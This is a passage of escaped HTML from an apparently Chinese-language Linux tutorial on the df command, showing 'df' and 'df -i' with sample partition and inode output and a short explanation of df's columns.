&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
df&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c97090f940851100-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c97090f940851100-1&quot;&gt;&lt;span class=&quot;crayon-r&quot;&gt;df&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0003 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c970912154832684&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@CT1190 log]# df

文件系统               1K-块        已用     可用 已用% 挂载点

/dev/sda7             19840892    890896  17925856   5% /

/dev/sda9            203727156 112797500  80413912  59% /opt

/dev/sda8              4956284    570080   4130372  13% /var

/dev/sda6             19840892   1977568  16839184  11% /usr

/dev/sda3               988116     23880    913232   3% /boot

tmpfs                 16473212         0  16473212   0% /dev/shm&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970912154832684-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970912154832684-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970912154832684-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970912154832684-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970912154832684-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970912154832684-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970912154832684-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970912154832684-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970912154832684-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970912154832684-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970912154832684-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970912154832684-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970912154832684-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970912154832684-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970912154832684-15&quot;&gt;15&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970912154832684-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;CT1190&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# df&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970912154832684-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970912154832684-3&quot;&gt;文件系统               &lt;span class=&quot;crayon-cn&quot;&gt;1K&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;块        已用     可用 已用&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; 挂载点&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970912154832684-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970912154832684-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda7&lt;/span&gt;             &lt;span class=&quot;crayon-cn&quot;&gt;19840892&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;890896&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;17925856&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970912154832684-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970912154832684-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda9&lt;/span&gt;            &lt;span class=&quot;crayon-cn&quot;&gt;203727156&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;112797500&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;80413912&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;opt&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970912154832684-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970912154832684-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda8&lt;/span&gt;              &lt;span class=&quot;crayon-cn&quot;&gt;4956284&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;570080&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;4130372&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970912154832684-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970912154832684-11&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda6&lt;/span&gt;             &lt;span class=&quot;crayon-cn&quot;&gt;19840892&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;1977568&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;16839184&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;usr&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970912154832684-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970912154832684-13&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda3&lt;/span&gt;               &lt;span class=&quot;crayon-cn&quot;&gt;988116&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;23880&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;913232&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;boot&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970912154832684-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970912154832684-15&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;tmpfs&lt;/span&gt;                 &lt;span class=&quot;crayon-cn&quot;&gt;16473212&lt;/span&gt;         &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;16473212&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;shm&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0030 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;linux中df命令的输出清单的第1列是代表文件系统对应的设备文件的路径名（一般是硬盘上的分区）；第2列给出分区包含的数据块（1024字节）的数目；第3，4列分别表示已用的和可用的数据块数目。用户也许会感到奇怪的是，第3，4列块数之和不等于第2列中的块数。这是因为缺省的每个分区都留了少量空间供系统管理员使用。即使遇到普通用户空间已满的情况，管理员仍能登录和留有解决问题所需的工作空间。清单中Use% 列表示普通用户空间使用的百分比，即使这一数字达到100％，分区仍然留有系统管理员使用的空间。最后，Mounted on列表示文件系统的挂载点。&lt;/p&gt;
&lt;p&gt;实例2：以inode模式来显示磁盘使用情况&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c970916808270659&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
df -i&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970916808270659-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970916808270659-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;df&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;i&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c970919086481248&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@CT1190 log]# df -i

文件系统               Inode (I)已用 (I)可用 (I)已用% 挂载点

/dev/sda7            5124480    5560 5118920    1% /

/dev/sda9            52592640   50519 52542121    1% /opt

/dev/sda8            1280000    8799 1271201    1% /var

/dev/sda6            5124480   80163 5044317    2% /usr

/dev/sda3             255232      34  255198    1% /boot

tmpfs                4118303       1 4118302    1% /dev/shm&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970919086481248-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970919086481248-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970919086481248-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970919086481248-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970919086481248-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970919086481248-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970919086481248-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970919086481248-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970919086481248-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970919086481248-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970919086481248-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970919086481248-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970919086481248-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970919086481248-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970919086481248-15&quot;&gt;15&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970919086481248-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;CT1190&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# df -i&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970919086481248-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970919086481248-3&quot;&gt;文件系统               &lt;span class=&quot;crayon-i&quot;&gt;Inode&lt;/span&gt; &lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;已用 &lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;可用 &lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;已用&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; 挂载点&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970919086481248-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970919086481248-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda7&lt;/span&gt;            &lt;span class=&quot;crayon-cn&quot;&gt;5124480&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;5560&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;5118920&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970919086481248-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970919086481248-7&quot;&gt;
